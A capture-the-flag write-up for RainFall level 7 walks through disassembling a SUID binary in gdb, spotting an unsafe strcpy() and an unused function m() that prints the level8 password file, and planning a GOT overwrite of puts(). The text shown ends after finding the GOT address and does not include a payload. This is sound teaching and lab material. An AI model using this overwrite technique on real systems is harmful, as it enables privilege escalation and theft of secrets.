# Level 7

## Vulnerability

Memory Corruption

## Context

We find a binary with owner level8 and SUID.
```
level7@RainFall:~$ ls -l
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```
It segfaults when run with 0 or 1 argument. It reponds to 2 or more arguments with "~".
```
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 anya
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 anya drew
~~
level7@RainFall:~$ ./level7 anya drew win
~~
```

## Solution

Let's explore the binary using gdb. 
We can see here that ```main()``` makes 2 calls to ```strcpy()```, and one call to each ```fopen()``` and ```fgets()```.
```strcpy()``` is unsafe in that it has no length parameter, which leaves it vulnerable to buffer overflows and consequent memory corruption. 
```
level7@RainFall:~$ gdb -q level7
(gdb) disas main
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
```
Let's take a deeper look at the ```fopen()``` and ```fgets()``` parameters.
It looks like it opens the file with the password we're looking for, and saves it in ```c```!
It then does nothing with ```c```.
```
(gdb) x/s 0x80486e9
0x80486e9:	 "r"
(gdb) x/s 0x80486eb
0x80486eb:	 "/home/user/level8/.pass"
(gdb) x/s 0x8049960
0x8049960 <c>:	 ""
```
Let's see if that's everything. 
We can see a function ```m()``` that is never called. 
This function prints ```time()``` and the variable ```c```!
```
(gdb) info function
All defined functions:
[...]
0x080484f4  m
[...]
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
```
Sooo the exploit here is to call ```m()``` by overwriting ```puts()``` in the GOT... and thus print ```c``` (and the password)!

Lets locate the addresses of ```m()``` and ```puts()```.
We saw earlier in ```(gdb) info functions``` the address of ```m()``` is 0x080484f4.
We saw earlier in ```(gdb) disas main```the address of ```puts()``` in the PLT is 0x8048400, but that's just a pointer to another memory address. Lets see if we can get its GOT address... it's 0x8049928.
```
(gdb) x/i 0x8048400
   0x8048400 <puts@plt>:	jmp    *0x8049928
```


